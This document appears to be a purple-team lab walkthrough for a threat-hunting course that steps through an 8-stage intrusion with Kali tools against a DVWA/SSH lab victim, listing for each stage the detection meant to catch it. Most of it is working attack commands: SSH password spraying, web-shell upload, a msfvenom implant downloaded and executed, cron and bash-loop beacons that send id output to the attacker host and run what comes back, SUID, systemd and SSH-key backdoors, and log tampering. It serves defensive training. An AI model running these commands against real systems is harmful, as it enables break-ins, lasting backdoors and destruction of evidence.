# Class 11 — Manual Attack Walkthrough (real Kali tools)

Reproduce the 8-stage intrusion **by hand** with tools shipped in Kali, against a
lab victim, so the hunt in `hunt.sh` is chasing artifacts you actually generated.

`attack.sh` *fakes* the artifacts; this document *creates* them for real.

---

## Authorization & scope

> Run this **only** against the lab victim below, on an **isolated host-only /
> internal network with no route to the internet or production**. This is
> adversary emulation for a defensive-operations course. Running any of it
> against a system you are not explicitly authorized to test is a crime.

A full **cleanup** section is at the end. Reset the victim (snapshot revert or
`docker compose down -v`) after each run.

---

## Topology

| Host | Role | Address (example) |
|------|------|-------------------|
| Kali | attacker | `192.168.56.5` |
| web01 | victim (DVWA + OpenSSH) | `192.168.56.10` |

```bash
export VICTIM=192.168.56.10
export LHOST=192.168.56.5
export LPORT=4444
mkdir -p ~/engagements/class11 && cd ~/engagements/class11
```

### Stand up the victim

```bash
cd labs/class-11-threat-hunting/victim
./run.sh
# DVWA -> http://<victim>:8080  (admin/password — DB reset + security = Low already done)
# SSH  -> ssh support@<victim> -p 2222  (support/support)
```

`./run.sh` brings both containers up and drives DVWA's `setup.php` / security page
for you, so the upload vuln is live the moment it returns. Reset between runs with
`./run.sh clean && ./run.sh`. Metasploitable 2/3 or a VulnHub box work the same way
— adjust ports.

---

## Stage map

| # | Stage | Primary Kali tools | ATT&CK | Detected by |
|---|-------|--------------------|--------|-------------|
| 1 | Recon | `masscan` `nmap` `whatweb` `nikto` `feroxbuster` | T1595, T1046 | Suricata ET SCAN |
| 2 | Credential access | `hydra` `medusa` `ffuf` | T1110 | auth.log burst · hunt 2 |
| 3 | Initial access (web shell) | `weevely` `curl` | T1190, T1505.003 | YARA · hunt 1 |
| 4 | Execution / discovery | `weevely` `linpeas` | T1059, T1082, T1087 | web-log · auditd · hunt 2 |
| 5 | Ingress tool transfer | `msfvenom` `python3 -m http.server` `wget` | T1105 | Suricata ET · Zeek files.log · hunt 2 |
| 6 | Persistence | `cron` `chmod u+s` `systemd` `ssh-keygen` | T1548.001, T1053, T1543, T1098 | hunt 4 · hunt 5 · auditd |
| 7 | C2 beacon | `msfconsole` / `sliver` / bash loop | T1071.001, T1573 | Zeek long-conn · hunt 3 |
| 8 | Defense evasion | `history -c` `touch` `shred` `sed` | T1070 | hunt 2 uses archived + `zgrep` |

---

## Stage 1 — Reconnaissance & enumeration

**Blue sees:** Suricata `ET SCAN` bursts, Zeek many short conns from one src, web-log 404 storm.

```bash
# fast full-range port sweep
sudo masscan $VICTIM -p1-65535 --rate 1000 -oL masscan.txt

# service/version/default-scripts on the open ports
sudo nmap -sS -sV -sC -p 22,80,2222,8080 -oA nmap_web01 $VICTIM

# web fingerprint + WAF check
whatweb -a3 http://$VICTIM:8080
wafw00f http://$VICTIM:8080

# web vuln scan
nikto -h http://$VICTIM:8080 -o nikto_web01.txt

# content discovery — find the upload page and uploads dir
feroxbuster -u http://$VICTIM:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o ferox.txt
# expect: /login.php  /setup.php  /hackable/uploads/  /vulnerabilities/upload/
```

---

## Stage 2 — Credential access (SSH brute / spray)

**Blue sees:** `/var/log/auth.log` "Failed password" burst from one IP → **hunt 2** · Wazuh 5710/5712/5720 · fail2ban (Class 12).

```bash
printf 'root\nadmin\nsupport\ndeploy\nwww-data\n' > users.txt

sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
head -n 50 /usr/share/wordlists/rockyou.txt > pw_small.txt   # keep the demo quick
grep -qx support pw_small.txt || echo support >> pw_small.txt # ensure a hit

# spray SSH  (-t 4 threads, -f stop on first valid, port 2222)
hydra -L users.txt -P pw_small.txt ssh://$VICTIM:2222 -t 4 -f -o hydra_ssh.txt
#  alt:  medusa -h $VICTIM -M ssh -n 2222 -U users.txt -P pw_small.txt -f
#  alt:  patator ssh_login host=$VICTIM port=2222 user=FILE0 password=FILE1 \
#             0=users.txt 1=pw_small.txt -x ignore:mesg='Authentication failed'

ssh support@$VICTIM -p 2222        # creds from hydra_ssh.txt
```

Web login brute (DVWA) with `ffuf`:

```bash
ffuf -w pw_small.txt -u "http://$VICTIM:8080/login.php" \
  -X POST -d "username=admin&password=FUZZ&Login=Login" \
  -H "Content-Type: application/x-www-form-urlencoded" -fr "Login failed"
```

---

## Stage 3 — Initial access (web shell upload)

**Blue sees:** new `.php` in uploads dir (mtime, owner `www-data`), YARA match → **hunt 1** · FIM/auditd file-create · web-log `POST /vulnerabilities/upload/`.

```bash
# obfuscated PHP agent (weevely) rather than a plain shell
weevely generate S3cr3tPass ./agent.php

# DVWA (Security=Low): log in, copy PHPSESSID from devtools -> Storage -> Cookies
export CK="security=low; PHPSESSID=PASTE_HERE"

# upload exactly like the form does
curl -s -b "$CK" -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@agent.php;type=image/png" -F "Upload=Upload" \
  "http://$VICTIM:8080/vulnerabilities/upload/" | grep -o 'succesfully uploaded.*'
#   stored at /hackable/uploads/agent.php

curl -s "http://$VICTIM:8080/hackable/uploads/agent.php"   # weevely -> blank 200
```

Plain-shell variant (matches `scenario/webshell.php`, triggers `rules/hunt_webshell.yar`):

```bash
cp ../scenario/webshell.php ./cmd.php
curl -s -b "$CK" -F "uploaded=@cmd.php;type=image/png" -F "Upload=Upload" \
  "http://$VICTIM:8080/vulnerabilities/upload/"
curl -s "http://$VICTIM:8080/hackable/uploads/cmd.php?c=aWQ7dW5hbWUgLWE="  # id;uname -a
```

---

## Stage 4 — Execution & discovery

**Blue sees:** repeated web hits to the shell from one external IP → **hunt 2** · auditd `execve` of discovery binaries by `www-data`.

```bash
# interactive session over the uploaded agent
weevely "http://$VICTIM:8080/hackable/uploads/agent.php" S3cr3tPass

# in the weevely prompt:
:system_info
id ; hostname ; uname -a
cat /etc/passwd | cut -d: -f1
sudo -n -l 2>/dev/null
find / -writable -type d 2>/dev/null | head
```

Automated local enum — host on Kali, pull on victim (lab-only):

```bash
# Kali
cp /usr/share/peass/linpeas/linpeas.sh . 2>/dev/null || \
  curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
python3 -m http.server 8000
# victim
curl -s http://$LHOST:8000/linpeas.sh | sh | tee /tmp/.lp.txt
```

---

## Stage 5 — Ingress tool transfer (second stage)

**Blue sees:** victim `curl`/`wget` to an unusual host:port → **hunt 2** · Suricata ET on the fetch · Zeek `http.log`/`files.log` shows an ELF over HTTP.

```bash
# Kali: build an ELF implant and serve it
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=8443 -f elf -o update
python3 -m http.server 80

# victim (weevely or ssh):
curl -s http://$LHOST/update -o /dev/shm/.u && chmod +x /dev/shm/.u && /dev/shm/.u &
#  or: cd /tmp && wget -q http://$LHOST/update -O .update && chmod +x .update && ./.update &
```

---

## Stage 6 — Persistence

**Blue sees:** SUID diff vs baseline → **hunt 4** · executable in `/dev/shm` → **hunt 5** · new cron/systemd unit · appended `authorized_keys` · auditd watches on `/etc/cron*`, `/etc/systemd`, `~/.ssh`.

```bash
# a) hidden SUID root shell
sudo cp /bin/dash /opt/.helper && sudo chmod 4755 /opt/.helper
#    use later:  /opt/.helper -p -c 'id'    -> uid=0

# b) cron beacon (this also produces the Stage 7 traffic pattern)
( crontab -l 2>/dev/null; \
  echo '*/60 * * * * curl -s -m 10 https://'"$LHOST"'/c2 -d "$(id;hostname)" -o /tmp/.t 2>/dev/null; sh /tmp/.t 2>/dev/null' \
) | crontab -
crontab -l

# c) systemd service persistence
sudo tee /etc/systemd/system/soc-update.service >/dev/null <<EOF
[Unit]
Description=System Update Helper
[Service]
ExecStart=/dev/shm/.u
Restart=always
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable --now soc-update.service

# d) SSH authorized_keys backdoor
ssh-keygen -t ed25519 -N '' -f ./lab_key
ssh support@$VICTIM -p 2222 "mkdir -p ~/.ssh && echo '$(cat lab_key.pub)' >> ~/.ssh/authorized_keys"
ssh -i ./lab_key support@$VICTIM -p 2222   # now key-only, no password
```

---

## Stage 7 — Command & Control (long-interval beacon)

**Blue sees:** Zeek `conn.log` — same src→dst, near-constant tiny byte counts, regular ~3600 s interval → **hunt 3**.

**Option A — Metasploit HTTPS handler**

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD linux/x64/meterpreter_reverse_https; \
  set LHOST $LHOST; set LPORT 8443; \
  set SessionCommunicationTimeout 0; \
  set EnableStageEncoding true; run -j"
# in the meterpreter session, stretch the beacon so it looks like C2, not interactive:
#   meterpreter > set_timeouts -c 3600
```

**Option B — Sliver (stealthier, current tradecraft)**

```bash
sudo apt install -y sliver
sliver
sliver > https --lhost $LHOST --lport 443
sliver > generate beacon --http $LHOST --seconds 3600 --jitter 600 --save ./impl
# deliver ./impl via Stage 5, then:  sliver > beacons
```

**Option C — pure bash (no framework, clearest for teaching hunt 3)**

```bash
# on victim — 1-hour interval, a few hundred bytes each way
nohup sh -c 'while true; do \
  curl -sk -m 10 https://'"$LHOST"'/checkin -d "$(id)"'" > /tmp/.job 2>/dev/null; \
  sh /tmp/.job 2>/dev/null; sleep 3600; done" >/dev/null 2>&1 &
```

Let it run ≥3 cycles before hunting so `conn.log` shows the rhythm.

---

## Stage 8 — Defense evasion / anti-forensics

**Blue sees:** you can't scrub what already shipped to the SIEM/Zeek — that's the lesson. **Hunt 2** deliberately searches `*.1` and `*.gz` archives with `zgrep`.

```bash
# on victim
export HISTFILE=/dev/null ; history -c
unset SSH_CONNECTION
touch -r /bin/ls /opt/.helper /dev/shm/.u          # timestomp to match a system binary
sudo sed -i '/45.153.160.140\|193.169.255.78/d' /var/log/auth.log   # tamper live log
shred -u /tmp/.lp.txt /tmp/.job 2>/dev/null
```

Then collect what a responder would pull and run the hunt against it:

```bash
# from labs/class-11-threat-hunting/ — pulls apache + sshd logs, your uploaded
# shells, and any planted SUID / /dev/shm files off the live containers into ./work/
./collect.sh
./hunt.sh -s
```

`collect.sh` builds the same `./work/` layout the offline `setup.sh` produces, so
`hunt.sh` is unchanged — it is just now chasing artifacts you generated. If you
attacked a non-Docker victim instead, `scp` its `/var/log/*` and `/var/www/html`
into `./work/` in that layout and run `./hunt.sh` directly.

---

## Full cleanup

```bash
# victim
sudo systemctl disable --now soc-update.service; sudo rm -f /etc/systemd/system/soc-update.service
sudo systemctl daemon-reload
crontab -r
sudo rm -f /opt/.helper /dev/shm/.u /tmp/.update /tmp/.u /tmp/.t /tmp/.job
sed -i '/lab_key/d' ~/.ssh/authorized_keys 2>/dev/null
ssh support@$VICTIM -p 2222 "sed -i '/$(awk '{print $2}' lab_key.pub | cut -c1-20)/d' ~/.ssh/authorized_keys"
# remove uploaded shells
rm -f /var/www/html/hackable/uploads/agent.php /var/www/html/hackable/uploads/cmd.php

# easiest: just tear the whole target down
cd labs/class-11-threat-hunting/victim && docker compose down -v

# Kali
pkill -f "http.server" ; pkill -f msfconsole ; rm -rf ~/engagements/class11/work
```

Kill any Metasploit/Sliver listeners and revert the victim snapshot.

---

## Coverage checklist (fill this in as you go)

| Stage | Technique fired | Sensor saw it? | Alert fired? | Hunt found it cold? | New/tuned rule |
|-------|-----------------|:--:|:--:|:--:|----------------|
| 1 | T1046 scan | | | | |
| 2 | T1110 SSH brute | | | | |
| 3 | T1505.003 web shell | | | | |
| 4 | T1059 exec | | | | |
| 5 | T1105 transfer | | | | |
| 6 | T1548.001 SUID | | | | |
| 7 | T1071.001 beacon | | | | |
| 8 | T1070 log tamper | | | | |

> A purple-team run that ends without a new or tuned detection was just a demo.
